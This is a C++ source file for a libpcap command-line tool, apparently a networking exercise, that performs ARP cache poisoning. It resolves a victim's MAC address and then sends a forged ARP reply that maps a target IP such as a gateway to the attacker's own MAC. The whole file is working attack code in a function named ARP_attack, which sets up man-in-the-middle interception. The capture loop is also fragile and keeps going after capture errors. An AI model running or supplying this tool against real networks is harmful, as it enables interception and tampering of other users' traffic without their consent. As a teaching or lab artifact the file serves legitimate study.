#include <cstdio>
#include <pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <linux/if.h>
#include <string>
#include <regex>
#include <fstream>
#include <streambuf>
#include <stdint.h>
#include <netdb.h>
#include "ethhdr.h"
#include "arphdr.h"

using namespace std;

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

#define REQUEST 0
#define REPLY 1

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> [<sender ip2> <target ip2> ...]\n");
}

void get_self_mac(char* dst_buf, const string& device) {
	string mac_addr;
	ifstream iface("/sys/class/net/"+device+"/address");
	string str((istreambuf_iterator<char>(iface)), istreambuf_iterator<char>());
	uint8_t tmp_mac[6];
	
	if(str.length()>0){
		string hex = regex_replace(str, regex(":"), "");
		uint64_t res = stoull(hex, 0, 16);
		for (int i = 0; i < 6; i++) {
			tmp_mac[i] = (uint8_t)((res & ((uint64_t)0xff << (i * 8))) >> (i * 8));
		}
		snprintf(dst_buf, 18, "%02x:%02x:%02x:%02x:%02x:%02x", tmp_mac[5], tmp_mac[4], tmp_mac[3], tmp_mac[2], tmp_mac[1], tmp_mac[0]);
	}
	
	
	return;
}

void sendARPpacket(char* e_dmac, char* e_smac, char op, char* a_smac, char* a_sip, char* a_dmac, char* a_dip, pcap_t* handle) {
	EthArpPacket packet;

	packet.eth_.dmac_ = Mac(e_dmac);
	packet.eth_.smac_ = Mac(e_smac);
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;
	if (op == REQUEST)
		packet.arp_.op_ = htons(ArpHdr::Request);
	else
		packet.arp_.op_ = htons(ArpHdr::Reply);
	packet.arp_.smac_ = Mac(a_smac);
	packet.arp_.sip_ = htonl(Ip(a_sip));
	packet.arp_.tmac_ = Mac(a_dmac);
	packet.arp_.tip_ = htonl(Ip(a_dip));
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

}

void get_sender_mac(char* sender_mac, char* sender_ip, char* self_mac, pcap_t* handle, char* target_ip) {
	char broadcast_mac[18] = "FF:FF:FF:FF:FF:FF";
	char unknown_mac[18] = "00:00:00:00:00:00";
	sendARPpacket(broadcast_mac, self_mac, REQUEST, self_mac, target_ip, unknown_mac, sender_ip, handle);
	
	struct pcap_pkthdr* header;
	const u_char* p;
	int res;
	uint8_t* mac_ptr;
	
	while (true) {
		res = pcap_next_ex(handle, &header, &p);
		if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
			printf("packet capture error %d(%s)\n", res, pcap_geterr(handle));
		}
		
		
		uint16_t* type = (uint16_t*)(p + 12);
		if(*type == htons(EthHdr::Arp)) {
			if (*(uint16_t*)(p+20) == htons(ArpHdr::Reply)) {
				mac_ptr = (uint8_t*)(p+22);
				//printf("%02x %02x %02x %02x %02x %02x", *(p+22), *(p+23), *(p+24), *(p+25), *(p+26), *(p+27));
				break;
			}
		}
	}
	
	snprintf(sender_mac, 18, "%02x:%02x:%02x:%02x:%02x:%02x", mac_ptr[0], mac_ptr[1], mac_ptr[2], mac_ptr[3], mac_ptr[4], mac_ptr[5]);
}

void ARP_attack(char* sender_ip, char* target_ip, pcap_t* handle, char* self_mac) {
	char sender_mac[18];
	get_sender_mac(sender_mac, sender_ip, self_mac, handle, target_ip);
	printf("resolved sender mac: %s\n", sender_mac);
	
	sendARPpacket(sender_mac, self_mac, REPLY, self_mac, target_ip, sender_mac, sender_ip, handle);
	printf("send ARP attack packet complete\n\n");
}

int main(int argc, char* argv[]) {
	if (argc < 2 || (argc - 2) % 2 != 0) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	char self_mac[18];
	get_self_mac(self_mac, string(dev));
	printf("resolved self mac: %s\n", self_mac);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	for (int i = 2; i < argc; i += 2) {
		printf("attack victim(%s) target(%s)\n", argv[i], argv[i+1]);
		ARP_attack(argv[i], argv[i+1], handle, self_mac);
	}

	pcap_close(handle);
}
